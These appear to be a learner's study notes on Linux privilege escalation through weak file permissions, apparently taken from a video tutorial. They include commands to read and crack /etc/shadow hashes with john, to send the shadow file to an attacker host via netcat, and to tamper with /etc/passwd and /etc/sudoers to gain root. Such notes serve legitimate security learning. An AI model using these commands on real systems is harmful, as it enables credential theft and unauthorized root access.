# Weak File Permissions

### /etc/shadow file

```bash
ls -la /etc/shadow
cat /etc/shadow
echo 'hash'> hash
john hash --wordlist=/opt/rockyou.txt

```

Now in a machine with a low-privilege account

```jsx
su root 
password: *******
```

**Method 1: Attacker Listens (Recommended)**

The attacker opens a port to receive data, and the victim connects to push the file.

- **Attacker machine:**
    
    **bash**
    
    ```bash
    nc -nvlp 4444 > shadow
    ```
    
- **Victim machine:**
    
    **bash**
    
    ```bash
    nc <attacker_ip> 4444 < /etc/shadow
    ```
    

**Method 2: Victim Listens ( I will use it. )** 

The victim hosts the file on a port, and the attacker connects to pull it down.

- **Victim machine:**
    
    **bash**
    
    ```bash
    nc -nvlp 4444 < /etc/shadow
    ```
    
- **Attacker machine:**
    
    **bash**
    
    ```bash
    nc <victim_ip> 4444 > shadow
    ```
    

**Create sha512 hash for /etc/shadow**

```bash
openssl passwd -6 anypassword
```

### /etc/passwd file

Technique 1

:x: means it is stored in **/etc/shadow**

Remove x if you have write permission

![2026-08-26 14_37_17-Weak File Permissions __ Linux Privilege Escalation - YouTube.png](Weak%20File%20Permissions/2026-08-26_14_37_17-Weak_File_Permissions____Linux_Privilege_Escalation_-_YouTube.png)

 Technique 2

Replace the new hash with x

![2026-08-26 14_41_56-Weak File Permissions __ Linux Privilege Escalation - YouTube.png](Weak%20File%20Permissions/2026-08-26_14_41_56-Weak_File_Permissions____Linux_Privilege_Escalation_-_YouTube.png)

 Technique 3

Create a new user with a hash, but the other value will be the same

![2026-08-26 14_45_33-Weak File Permissions __ Linux Privilege Escalation - YouTube.png](Weak%20File%20Permissions/2026-08-26_14_45_33-Weak_File_Permissions____Linux_Privilege_Escalation_-_YouTube.png)

### /etc/sudoers file

Which user, what access?

```bash
ls -la /etc/sudoers
```

```bash
chmod o+rw /etc/sudoers
```

![2026-08-26 14_53_55-Weak File Permissions __ Linux Privilege Escalation - YouTube.png](Weak%20File%20Permissions/2026-08-26_14_53_55-Weak_File_Permissions____Linux_Privilege_Escalation_-_YouTube.png)

```bash
vim /etc/sudoers
```

![2026-08-26 14_58_26-Weak File Permissions __ Linux Privilege Escalation - YouTube.png](Weak%20File%20Permissions/2026-08-26_14_58_26-Weak_File_Permissions____Linux_Privilege_Escalation_-_YouTube.png)